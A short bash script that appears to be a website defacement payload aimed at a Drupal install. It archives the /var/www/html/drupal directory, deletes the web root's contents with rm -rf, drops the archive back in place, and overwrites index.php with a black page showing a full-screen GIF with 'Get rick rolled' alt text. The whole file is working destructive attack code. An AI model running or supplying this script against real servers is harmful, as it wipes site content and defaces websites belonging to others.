#!/bin/bash
if [ ! -f "/var/www/html/drupal/definitelynotyourwebsitefiles.tar" ]; then
    tar -cf /tmp/definitelynotyourwebsitefiles.tar /var/www/html/drupal
    rm -rf /var/www/html/drupal/*
    mv /tmp/definitelynotyourwebsitefiles.tar /var/www/html/drupal/
    echo '<?php
header("Content-Type: text/html; charset=utf-8");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        html, body {
            margin: 0;
            height: 100%;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: black;
        }
        #gif-container {
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #gif-container img {
            max-width: 100%;
            max-height: 100%;
        }
    </style>
</head>
<body>
    <div id="gif-container">
        <img src="https://media1.tenor.com/m/QP4hU_uG9x4AAAAd/revolution.gif" alt="Get rick rolled">
    </div>
</body>
</html>
' > /var/www/html/drupal/index.php
fi